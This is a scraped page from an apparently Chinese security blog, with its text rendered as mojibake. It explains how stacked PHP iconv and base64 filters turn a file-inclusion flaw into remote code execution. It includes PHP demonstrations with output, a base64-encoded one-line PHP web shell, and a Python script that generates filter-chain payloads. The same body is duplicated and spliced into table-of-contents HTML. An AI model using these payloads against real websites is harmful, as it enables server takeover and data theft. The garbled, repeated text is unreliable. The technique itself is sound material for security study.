æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.5.</span> <span class="toc-text">


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&text=Filteré“¾ä¹‹php"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&is_video=false&description=Filteré“¾ä¹‹php"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Filteré“¾ä¹‹php&body=Check out this article: http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&name=Filteré“¾ä¹‹php&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&t=Filteré“¾ä¹‹php"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> MenÃº</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    SunRT
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">æ€»è§ˆ</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">VHub</a></li>
         
          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-å®‰å…¨</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Kopiert!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
